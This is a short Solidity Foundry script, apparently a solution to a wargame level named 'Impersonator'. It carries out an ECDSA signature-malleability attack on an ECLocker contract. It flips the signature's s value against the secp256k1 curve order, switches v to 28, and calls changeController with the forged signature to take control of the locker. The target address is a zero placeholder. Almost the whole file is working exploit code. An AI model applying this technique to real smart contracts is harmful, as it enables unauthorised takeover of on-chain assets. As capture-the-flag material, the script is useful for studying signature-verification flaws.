// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;
import "forge-std/Script.sol";
import "src/levels/Impersonator/Impersonator.sol";

contract ImpersonatorAttackScript is Script {
    function setUp() public {}

    function run() public {
        Impersonator target = Impersonator(0x0000000000000000000000000000000000000000); // Insert target target address

        vm.startBroadcast();

        bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
        bytes32 s = bytes32(uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706));

        uint256 secp256k1_n = 115792089237316195423570985008687907852837564279074904382605163141518161494337;
        bytes32 tricked_s = bytes32(secp256k1_n - uint256(s));

        ECLocker locker0 = target.lockers(0);
        locker0.changeController(28, r, tricked_s, address(0));

        vm.stopBroadcast();
    }
}